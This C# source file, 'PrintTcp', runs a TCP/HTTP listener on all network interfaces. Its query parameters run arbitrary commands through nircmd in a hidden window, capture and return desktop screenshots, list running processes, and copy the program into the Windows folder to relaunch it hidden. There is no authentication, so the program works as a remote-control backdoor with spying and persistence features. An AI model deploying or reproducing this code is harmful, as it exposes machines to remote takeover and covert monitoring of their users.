using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Media;
using System.IO;
using System.Diagnostics;
using System.Web;

namespace PrintTcp
{
    class Program
    {
        static void Main(string[] args)
        {
            // Make only one instance
            // http://stackoverflow.com/questions/6486195/ensuring-only-one-application-instance
            bool result;
            var mutex = new System.Threading.Mutex(true, "lysyncPrintTcp", out result);
            if (!result)
            {
                return;
            }
            GC.KeepAlive(mutex);

            createTCP();
        }

        static void createTCP()
        {
            TcpListener server = null;
            try
            {
                // Set the TcpListener on port 13000.
                Int32 port = 12300;
                IPAddress localAddr = IPAddress.Parse("127.0.0.1");

                // TcpListener server = new TcpListener(port);
                // server = new TcpListener(localAddr, port);
                server = new TcpListener(IPAddress.Any, port);

                // Start listening for client requests.
                server.Start();

                // Buffer for reading data
                Byte[] bytes = new Byte[2560];
                String data = null;
                bool isExit = false;
                String snapFile = Path.GetTempPath() + @"printcp_snap.png";

                // Enter the listening loop.
                while (! isExit)
                {
                    Console.Write("Waiting for a connection... ");

                    // Perform a blocking call to accept requests.
                    // You could also user server.AcceptSocket() here.
                    TcpClient client = server.AcceptTcpClient();
                    Console.WriteLine("Connected!");

                    data = "";

                    // Get a stream object for reading and writing
                    NetworkStream stream = client.GetStream();

                    int i;

                    // Loop to receive all the data sent by the client.
                    if ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        // Translate data bytes to a ASCII string.
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        var url = data.Split(' ')[1];
                        //url = HttpUtility.UrlDecode(url).Substring(1);
                        var query = HttpUtility.ParseQueryString(new Uri("http://localhost"+url).Query);
                        Console.WriteLine("Received: {0}---{1}", url, query["cmd"]);


                        var ret = "<form method=\"GET\"><input type=checkbox name=debug value=1><input type=text name=cmd></form>";
                        if (query["debug"] == "1")
                        {

                            ret += "<pre>" + query["cmd"] + "</pre>";
                        }
                        else if (!string.IsNullOrEmpty(query["cmd"])) exeCmd(query["cmd"]);

                        if (query["exit"]=="1") isExit = true;

                        // get snapshot of client
                        if (query["snap"] == "1")
                        {
                            exeCmd("savescreenshot \"~$sys.temp$\\printcp_snap.png\"");
                        }


                        if (query["snap"] == "2" && File.Exists(snapFile))
                        {
                            byte[] imageArray = System.IO.File.ReadAllBytes(snapFile);
                            string base64String = Convert.ToBase64String(imageArray);
                            ret = "<style>*{margin:0;padding:0;}</style><img src=\"data:image/png;base64," + base64String + "\">";
                        }


                        // get process of client
                        if (query["proc"] == "1")
                        {
                            Process[] processlist = Process.GetProcesses();
                            ret += "<style>td,th{font-size:12px;padding:0;text-align:left;}</style><b>Process:</b><table cellborder=0><tr><th>NAME</th><th>CPU</th><th>MEM</th><th>PID</th><th>FILE</th></tr>";
                            foreach (Process theprocess in processlist)
                            {
                                var proc_filename = "";
                                var cpu_time = ""; 
                                try
                                {
                                    proc_filename = theprocess.MainModule.FileName;
                                    cpu_time = new DateTime(theprocess.TotalProcessorTime.Ticks).ToString("HH:mm:ss");
                                }
                                catch (Exception err) {
                                    
                                }

                                ret += String.Format("<tr><td>{0}</td><td>{1}&nbsp;&nbsp;</td><td>{2:n0} KB</td><td>{3}&nbsp;&nbsp;</td><td>{4}</td></tr>", theprocess.ProcessName, cpu_time, theprocess.VirtualMemorySize64 / 1024, theprocess.Id, proc_filename);
                            }
                            ret += "</table>";
                        }

                        if (query["update"] == "1")
                        {
                            exeCmd("cmdwait 5000 execmd copy /y \"M:\\日常软件\\PrintTcp.exe\" \"~$folder.windows$\\PrintTcp.exe\"");
                            exeCmd("cmdwait 10000 exec hide \"~$folder.windows$\\PrintTcp.exe\"");
                            isExit = true;
                        }

                        // Process the data sent by the client.
                        //data = data.ToUpper();
                        data = "HTTP/1.1 200 OK\r\nContent-Type:text/html; charset=UTF-8\r\nContent-Length: " + ret.Length + "\r\n\r\n" + ret;

                        byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

                        // Send back a response.
                        stream.Write(msg, 0, msg.Length); 
                        //Console.WriteLine("Sent: {0}", data);

                        
                    }

                    // Shutdown and end connection
                    client.Close();


                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                // Stop listening for new clients.
                server.Stop();
            }


            //Console.WriteLine("\nHit enter to continue...");
            //Console.Read();
        }

        static void exeCmd(string arg)
        {
            string path = Directory.GetCurrentDirectory();
            DirectoryInfo d = new DirectoryInfo(path);

            ProcessStartInfo startInfo = new ProcessStartInfo();

            startInfo.CreateNoWindow = false;
            startInfo.UseShellExecute = true;
            startInfo.FileName = "nircmd.exe";
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.WorkingDirectory = d.FullName;
            startInfo.Arguments = arg;

            Process.Start(startInfo);

            return;
        }


        static void playSound()
        {
            string path = Directory.GetCurrentDirectory();
            DirectoryInfo d = new DirectoryInfo(path);

            ProcessStartInfo startInfo = new ProcessStartInfo();

            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = true;
            startInfo.FileName = "nircmd.exe";
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.WorkingDirectory = d.FullName;
            startInfo.Arguments = "mediaplay 33000 success.wav";

            Process.Start(startInfo);

            return;
            
            //Console.WriteLine("...." + d.Parent.Parent.Parent.FullName);
            Console.WriteLine(d.FullName + "\\success.wav");

            using (SoundPlayer player = new SoundPlayer( "success.wav"))
            {
                try
                {
                    player.Play();
                }
                catch (Exception err) {
                    Console.WriteLine(err.Message);
                }
            }
        }
    }
}
